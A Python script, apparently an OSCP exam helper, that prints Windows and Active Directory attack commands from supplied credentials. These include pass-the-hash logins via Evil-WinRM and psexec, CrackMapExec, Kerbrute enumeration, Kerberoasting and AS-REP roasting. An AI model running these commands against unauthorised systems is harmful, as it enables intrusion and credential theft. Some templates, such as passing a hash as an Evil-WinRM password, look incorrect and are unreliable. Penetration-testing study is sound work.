import argparse


def main():
    parser = argparse.ArgumentParser(description="Generate OSCP enumeration commands", add_help=False)
    parser.add_argument('-u', '--user', required=True, help='Username')
    parser.add_argument('-p', '--password', required=True, help='Password')
    parser.add_argument('-h', '--hash', dest='hash', required=True, help='NTLM hash')
    parser.add_argument('-d', '--domain', required=True, help='Domain name')
    parser.add_argument('-ip', '--ip', dest='ip', required=True, help='Target IP address')
    parser.add_argument('-H', '--help', action='help', default=argparse.SUPPRESS, help='show this help message and exit')
    args = parser.parse_args()

    user = args.user
    password = args.password
    hashval = args.hash
    domain = args.domain
    ip = args.ip

    quoted_password = f"'{password}'"
    base_dn = ','.join(f'DC={part.upper()}' for part in domain.split('.'))

    print('*****Evil-WinRM:*****')
    print(f"evil-winrm -i {ip} -u {user} -p {hashval}:{hashval}")
    print(f"evil-winrm -i {ip} -u {user} -p {quoted_password}")
    print(f"evil-winrm -i {ip} -u {domain}/{user} -p {quoted_password}")
    print()

    print('*****Psexec:*****')
    print(f"python3 /opt/impacket/psexec.py '{domain}/{user}:{password}@{ip}'")
    print(f"python3 /opt/impacket/psexec.py '{user}:{password}@{ip}'")
    print(f"python3 /opt/impacket/psexec.py -hashes {hashval}:{hashval} {user}@{ip}")
    print(f"python3 /opt/impacket/psexec.py -hashes {hashval}:{hashval} {domain}/{user}@{ip}")
    print()

    print('*****Crackmap:*****')
    print(f"crackmapexec smb {ip} -u {user} -p {quoted_password}")
    print(f"crackmapexec smb {ip} -u {user} -p {quoted_password} --shares")
    print(f"crackmapexec ldap {ip} -u {user} -H {hashval}")
    print(f"crackmapexec winrm {ip} -u {user} -p {quoted_password}")
    print()

    print('*****RDP:*****')
    print(f"xfreerdp /u:{user} /p:{quoted_password} /v:{ip}")
    print(f"xfreerdp /u:{domain}/{user} /p:{quoted_password} /v:{ip}")
    print(f"xfreerdp /u:{user} /p:{quoted_password} /v:{ip} /cert-ignore")
    print()

    print('*****SSH:*****')
    print(f"ssh {user}@{ip} -p 22022")
    print()

    print('*****FTP:*****')
    print(f"ftp -p {ip} 2121")
    print()

    print('*****SQL:*****')
    print(f"python3 /opt/impacket/mssqlclient.py '{user}:{password}@{ip}' -windows-auth")
    print(f"python3 /opt/impacket/mssqlclient.py '{domain}/{user}:{password}@{ip}' -windows-auth")
    print()

    print('*****rpcclient:*****')
    print(f"rpcclient -U \"\" -N {ip}")
    print(f"rpcclient -U \"{user}\" {ip}")
    print(f"rpcclient -U \"{domain}/{user}\" {ip}")
    print()

    print('*****ldapsearch:*****')
    print(f"ldapsearch -x -H ldap://{ip} -s base -b \"\" namingcontexts")
    print(f"ldapsearch -x -H ldap://{ip} -b \"\" '{base_dn}'")
    print(f"ldapsearch -x -H ldap://{ip} -D '{domain}\\{user}' -w {quoted_password} -b \"{base_dn}\"")
    print()

    print('*****Kerbrute:*****')
    print(f"kerbrute userenum -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc {ip}")
    print()

    print('*****Kerberoast:*****')
    print(f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip {ip} {domain}/{user} ")
    print(f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip {ip} {domain}/{user} -save -outputfile GetUserSPNs.out")
    print()

    print('*****ASrepRoast:*****')
    print(f"python3 /opt/impacket/GetNPUsers.py -dc-ip {ip} -request {domain}/{user}")
    print(f"python3 /opt/impacket/GetNPUsers.py -dc-ip {ip} -no-pass -request {domain}/{user}")


if __name__ == '__main__':
    main()
